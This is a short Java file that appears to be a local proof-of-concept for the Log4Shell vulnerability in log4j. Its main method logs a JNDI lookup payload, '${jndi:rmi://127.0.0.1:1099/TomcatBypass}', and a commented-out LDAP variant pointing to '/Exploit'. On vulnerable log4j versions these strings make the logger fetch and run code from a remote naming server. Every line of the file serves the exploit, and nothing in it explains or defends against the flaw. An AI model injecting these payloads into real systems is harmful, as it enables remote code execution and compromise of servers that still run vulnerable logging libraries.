import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.InitialContext;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) throws Exception {
//        logger.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
        logger.error("${jndi:rmi://127.0.0.1:1099/TomcatBypass}");
//        new InitialContext().lookup("rmi://127.0.0.1:1099/TomcatBypass");
    }
}
